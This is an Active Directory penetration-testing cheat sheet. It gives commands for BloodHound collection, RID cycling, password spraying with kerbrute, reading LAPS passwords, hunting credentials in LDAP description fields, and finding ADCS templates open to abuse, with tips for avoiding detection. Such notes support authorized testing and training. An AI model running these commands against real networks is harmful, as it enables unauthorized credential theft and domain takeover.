BloodHound / SharpHound

Graph-based Active Directory enumeration. Essential for understanding domain structure and attack paths.

BloodHound Key Things to Check

Critical findings that often lead to quick wins:

  • Machine accounts as group members: Look for computer$ objects that are members of privileged groups (especially groups with WriteDacl on the domain)
  • Nested group memberships: Trace nested group paths that lead to Domain Admins membership
  • Account lockout policy: Check if LockoutBadCount = 0 (means unlimited password spray attempts — extremely valuable)
  • Password policy settings: Note MinimumPasswordLength and PasswordComplexity for tailoring password sprays
  • GPO-assigned privileges: Search for SeDebugPrivilege, SeImpersonatePrivilege, or other dangerous privileges granted via Group Policy
  • Registry AutoLogon usernames: Check SharpUp results for registry-stored AutoLogon credentials
  • Disabled Domain Admin accounts: May be re-enabled if domain admins are limited

Domain Policy Enumeration for Spray Safety

Before password spraying, check the account lockout policy:

nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' --pass-pol
# Check LockoutBadCount - if 0, unlimited spray attempts possible

RID Cycling

Enumerate users and groups by brute-forcing RID (Relative ID) values. SID format: S-1-5-21-<domain>-<RID>.

# NetExec RID brute-force
netexec smb <TARGET_IP> -u guest -p '' --rid-brute 10000 --log rid-brute.txt

# Impacket lookupsid
lookupsid.py -no-pass 'guest@<DOMAIN>' 20000

# Manual RID cycling with rpcclient
for i in $(seq 500 1100); do
  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep -E "User Name|user_rid|group_rid"
done

PowerShell Language Mode

$ExecutionContext.SessionState.LanguageMode
Mode Description
FullLanguage Unrestricted — all cmdlets, scripts, and .NET access
ConstrainedLanguage Limited — blocks Add-Type, .NET, COM; AMSI integrated
RestrictedLanguage No scripts, no variables (except $_), no script blocks
NoLanguage No scripts at all — only cmdlets via interactive prompt

Key insight: Constrained Language Mode (CLM) blocks Add-Type, direct .NET method calls, and COM object creation. This is why SharpView (compiled C#) is useful — it runs as a .NET binary outside PowerShell's language restrictions.

Local Administrators / LAPS

Get-LocalGroupMember -Group "Administrators"

Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers

LAPS attack opportunity: The account that joins a machine to the domain gets All Extended Rights on that computer object, which includes the ability to read the LAPS password.

SYSTEM Account and AD Enumeration: The SYSTEM account on a domain-joined machine has the same privileges as the computer account in AD. Tools like PsExec -s or services running as SYSTEM can enumerate AD without user credentials — the machine account authenticates via Kerberos automatically.

badpwdcount accuracy: The badPwdCount attribute is only accurate when queried against the PDC Emulator FSMO role holder. Other DCs may have stale values due to replication lag. Always target the PDC for password policy and lockout status checks.

Trust Types

Trust Type Description
Parent-Child Two-way transitive between parent and child domains in same forest
Cross-Link Between child domains to speed up authentication
External Non-transitive between domains in separate forests

Transitive vs Non-Transitive

Transitive Non-Transitive
Trust extends to child domains Only direct trust between two domains
If A trusts B, B trusts C -> A trusts C A trusts B, B trusts C -> A does NOT trust C
Forest, tree-root, parent-child, cross-link External trusts, custom setups

Attribute Meaning
WITHIN_FOREST Child domain, same forest
FOREST_TRANSITIVE Forest trust
EXTERNAL External trust

Snaffler

Automated tool for finding sensitive data in AD environments — searches shares, file servers, and DFS for credentials, configs, and secrets.

Snaffler.exe -s -d <DOMAIN> -o snaffler.log -v data
# -s output to stdout as well | -d target domain | -o output file | -v data show file contents

Snaffler color codes: Red = highest priority (passwords, private keys, credentials) | Yellow = high interest (config files, connection strings) | Green = interesting (scripts, batch files, internal docs).

Target file types: .config, .xml, .ini, .txt, .ps1, .bat, .cmd, .vbs, .kdb, .kdbx, .pfx, .key, .ppk, web.config, unattend.xml, sysprep files.

LDAP Description Fields — Password Goldmine

CRITICAL: User, computer, and group description fields in LDAP are frequently used by administrators to store passwords, reminders, or sensitive notes. Always enumerate descriptions.

# Find all users with descriptions (passwords often here!)
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' \
  -b "DC=<DOMAIN>,DC=<LOCAL>" \
  "(&(objectClass=user)(description=*))" sAMAccountName description

# Find all computers with descriptions
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' \
  -b "DC=<DOMAIN>,DC=<LOCAL>" \
  "(&(objectClass=computer)(description=*))" name description

Key insight: Service accounts frequently have passwords stored directly in the LDAP description field, visible to any authenticated user with LDAP read access. Always check descriptions for all user and computer objects.

adidnsdump — Full AD DNS Record Enumeration

Dumps all DNS records from Active Directory integrated DNS zones via LDAP, including records hidden from standard DNS queries.

adidnsdump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP>
adidnsdump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP> -r                  # resolve unknown types
adidnsdump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP> -r -o dns_records.csv
cat dns_records.csv | awk -F',' '{print $1, $3}' | sort -u

Key insight: Standard dig/nslookup only returns publicly-visible DNS records. adidnsdump queries LDAP directly to retrieve all AD-integrated DNS entries, revealing internal hosts, legacy servers, and forgotten infrastructure.

ADCS Enumeration with Certipy

Enumerate Active Directory Certificate Services for vulnerable templates that allow privilege escalation.

# Find all vulnerable certificate templates
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# Full enumeration + BloodHound integration
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -output certipy_output
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -bloodhound

# List certificate authorities
certipy ca -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -ca '<CA_NAME>' -list

Common vulnerable templates: ESC1 (enrollee can specify SAN -> request cert for any user including DA), ESC4 (write permissions on template -> modify to become ESC1), ESC8 (NTLM relay to AD CS HTTP enrollment endpoint).

Kerberos Enumeration with kerbrute

# Username enumeration (AS-REQ based)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_users.txt

# Password spray (one password against all users)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

Why kerbrute over CME for spraying: Kerberos pre-auth failures (Event 4771) are less monitored than NTLM logon failures (Event 4625). kerbrute also supports automatic jitter to avoid detection.

Generate a ready-to-use /etc/krb5.conf for tools that require Kerberos authentication (impacket, certipy, bloodyAD).

export KRB5CCNAME=/tmp/<USER>.ccache
export KRB5_CONFIG=./krb5.conf
klist
kinit <USER>@<DOMAIN>

Tool Selection Decision Flow

Have domain credentials?
- YES -> CrackMapExec/netexec for broad enumeration
         BloodHound for attack path analysis
         PowerView/SharpView from Windows
         ldapsearch/windapsearch from Linux

- NO  -> SMB NULL session (enum4linux, rpcclient -U "" -N)
         - Works?   -> Enumerate users, groups, shares, policies
         - Blocked? -> LDAP Anonymous Bind (ldapsearch -x)
                       - Works?   -> Enumerate users and objects
                       - Blocked? -> Kerbrute (valid username enum only)
                                     External recon (OSINT, breach data)

(Pwn3d!) indicator in CrackMapExec/netexec: When CME shows (Pwn3d!) next to a host, the supplied credentials have local admin access — you can execute commands, dump SAM, extract secrets.

Manual LDAP Queries with .NET System.DirectoryServices

When to use: on a Windows foothold where PowerView / SharpHound / SharpView would be flagged by AV, or where PowerShell module import is restricted. Everything here uses .NET classes built into every Windows install — no imports.

Reusable LDAPSearch function (paste once, call many times):

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC     = (Get-ADDomainController -Discover | Select-Object -ExpandProperty Name)  # or hard-code
    $DN      = ([adsi]'').distinguishedName
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")

    $DirSearcher = New-Object System.DirectoryServices.DirectorySearcher($DirEntry, $LDAPQuery)
    $DirSearcher.FindAll()
}

# Users
LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))" | ForEach-Object { $_.Properties.samaccountname }

# Groups
LDAPSearch -LDAPQuery "(objectCategory=group)" | ForEach-Object { $_.Properties.cn }

# Members of "Domain Admins"
$DAs = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Domain Admins))"
$DAs.Properties.member

LDAP compound-filter operators

Filters are RFC 4515 prefix-notation. Operators live at the START of the group.

Operator Meaning Example
& AND (&(objectClass=user)(cn=alice))
\| OR (\|(cn=alice)(cn=bob))
! NOT (!(userAccountControl:1.2.840.113556.1.4.803:=2)) = NOT disabled
= equals (exact) (cn=alice)
~= approx match (sn~=Smyth)
>= / <= ordering (uidNumber>=1000)
* wildcard (cn=admin*)

Bitmask idioms using the LDAP_MATCHING_RULE_BIT_AND OID 1.2.840.113556.1.4.803:

# Disabled accounts (UAC bit 2 set)
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Accounts that don't require Kerberos preauth (AS-REP roastable)
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Constrained-delegation accounts
(msDS-AllowedToDelegateTo=*)

# Unconstrained-delegation trusted computers
(userAccountControl:1.2.840.113556.1.4.803:=524288)

# NOT disabled + is a user
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

GPO Permission Analysis

Identify GPOs where non-admin users have modification rights — these can be abused for code execution across the domain.

# Find GPOs with modifiable permissions (PowerView)
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite" -and
  $_.SecurityIdentifier -match "<TARGET_USER_SID>"
}

Legal Considerations

  • Always have written authorization before enumeration
  • Document what was accessed and when
  • Be careful not to modify AD during enumeration
  • Some enumeration (especially on-machine) leaves minimal/no logs
  • RID cycling and null session tests are passive but still reconnaissance

SharpHound Collection Modes

:: Everything (default for most engagements)
.\SharpHound.exe -c All

:: DCOnly LDAP — quiet mode, no session/loggedon collection
.\SharpHound.exe --stealth --zipfilename STEALTH_COLLECT

:: Targeted collection (post-recollect after new cred)
.\SharpHound.exe -c Session,LoggedOn,Trusts,ACL --zipfilename TARGETED

-c All includes: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote.

Newer methods (SharpHound 2.x+ / BloodHound CE): CARegistry (reads CA registry keys on the DC — ADCS ESC prerequisite), DCRegistry (DC-side registry: LSA, NTLM policies), CertServices (ADCS templates, enrolment services/rights). Add explicitly if defaults don't include them:

.\SharpHound.exe -c All,CARegistry,DCRegistry,CertServices

BloodHound Cypher Cheatsheet

When to use: Complex queries beyond the built-in analysis tab. Paste into BloodHound's raw Cypher query window.

// PSRemote paths through group membership
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2

// RDP-rights paths
MATCH p=(u:User)-[:CanRDP]->(c:Computer) RETURN p

// Local admin (AdminTo)
MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN p

// DCSync-capable principals
MATCH p=()-[:DCSync|AllExtendedRights|GenericAll]->(:Domain) RETURN p

// LAPS-enabled computers
MATCH (c:Computer) WHERE c.haslaps = true RETURN c

// Constrained delegation opportunities
MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p

// Sessions of high-value users
MATCH p=(c:Computer)-[:HasSession]->(u:User) WHERE u.highvalue = true RETURN p

// Every user with a description field (hunt for creds)
MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.samaccountname, u.description

LAPS Enumeration (ms-Mcs-AdmPwd)

When to use: Some AD environments deploy LAPS — random-per-machine local Administrator password stored in the ms-Mcs-AdmPwd LDAP attribute. If your user has ExtendedRight on a Computer object, you can read it in cleartext.

# netexec / crackmapexec module — one command
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps
# Returns: <computer>$ : <cleartext local admin password>

# Manual ldapsearch (bound as authenticated user)
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=<DOMAIN>,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName

Web-to-AD Username Generation -> kerbrute userenum

When to use: You have a company's Team/About page with First+Last names but no valid AD username. Generate every plausible permutation, then pre-auth Kerberos-validate against the DC (no lockout risk — kerbrute uses AS-REQ pre-auth failures which don't increment badPwdCount).

# 1. From the Team page, grab names into names.txt (John Doe / Alice Smith)

# 2. username-anarchy generates every permutation
username-anarchy --input-file names.txt > users.txt
# generates: jdoe, jd, john.doe, john_doe, johndoe, doej, doe.j, j.doe, etc.

# 3. Pre-auth Kerberos user validation
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid.txt

# 4. Follow up with password spray (SAFE — 1 password x N users = 1 lockout tick per user)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid.txt 'Summer2024!'

Kerberos Double-Hop Problem — Workarounds

Symptom: In a WinRM/PSRemoting session, calls that touch a second machine (PowerView -> DC, remote share access) fail. klist shows only a TGS (HTTP/target), no TGT.

Root cause: Standard WinRM does not delegate the user's TGT to the remote — the remote host has a service ticket for HTTP/target only, not a TGT to request further tickets.

First, enumerate unconstrained-delegation servers (double-hop naturally works via TGT forwarding):

Get-DomainComputer -Unconstrained | select name

Workaround 1 — Pass -Credential explicitly to every cmdlet:

$Sec  = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\backupadm', $Sec)
Get-DomainUser -spn -Credential $Cred

Workaround 2 — Persistent PSSessionConfiguration with RunAsCredential:

Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential <DOMAIN>\backupadm
Restart-Service WinRM
Enter-PSSession -ComputerName DEV01 -Credential <DOMAIN>\backupadm -ConfigurationName backupadmsess

Workaround 3 — CredSSP delegation (OPSEC risk: credentials cached on remote):

Enable-WSManCredSSP -Role Client -DelegateComputer "target-server"
Enable-WSManCredSSP -Role Server                        # on the remote
Enter-PSSession -ComputerName "target" -Credential $cred -Authentication CredSSP
